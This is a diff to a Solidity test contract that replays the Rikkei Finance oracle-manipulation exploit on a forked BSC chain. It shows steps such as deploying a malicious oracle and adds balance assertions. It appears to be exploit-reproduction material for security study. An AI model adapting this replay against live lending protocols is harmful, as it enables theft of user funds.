@@ -57,7 +57,8 @@ contract Exploit_Rikkei is TestHarness, TokenBalanceTracker {
         IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56)  // BUSD
     ];
 
-    address internal attackerContract = 0xe6DF12a9f33605F2271D2a2DdC92E509E54E6b5F;
+    // Just for documentation purposes, this is the address of the attacker contract
+    // address internal attackerContract = 0xe6DF12a9f33605F2271D2a2DdC92E509E54E6b5F;
 
     IPancakeRouter01 internal router = IPancakeRouter01(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     IUnitroller internal unitroller = IUnitroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
@@ -67,7 +68,7 @@ contract Exploit_Rikkei is TestHarness, TokenBalanceTracker {
         cheat.createSelectFork('bsc', 16956473); // We pin one block before the exploit happened.
 
         // The attacker contract started with some BNBs.
-        cheat.deal(address(this), attackerContract.balance);
+        // cheat.deal(address(this), attackerContract.balance);
 
         for(uint256 i = 0; i < tokens.length; i++){
             addTokenToTracker(address(tokens[i]));
@@ -83,6 +84,7 @@ contract Exploit_Rikkei is TestHarness, TokenBalanceTracker {
         console.log('------- STEP 0: INITIAL BALANCE -------');
         console.log('Attacker');
         logBalances(address(this));
+        uint256 balanceBefore = rBNB.balanceOf(address(this));
 
         console.log('------- STEP 1: DEPLOY MALICIOUS ORACLE -------');
         address maliciousOracle = deployMaliciousOracle(0);
@@ -136,10 +138,13 @@ contract Exploit_Rikkei is TestHarness, TokenBalanceTracker {
 
         console.log('------- STEP 5: ATTACKER BALANCES AFTER SWAPS -------');
         logBalances(address(this));
+        uint256 balanceAfter = rBNB.balanceOf(address(this));
+        assertGe(balanceAfter, balanceBefore);
 
         console.log('------- STEP 6: SETS THE ORACLE BACK -------'); 
         // sets the BNB/USD oracle back again
         priceOracle.setOracleData(address(rBNB), ChainLinkOracle(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE));
+
     }
 
     function deployMaliciousOracle(uint256 _salt) internal returns(address newOracleDeployed){
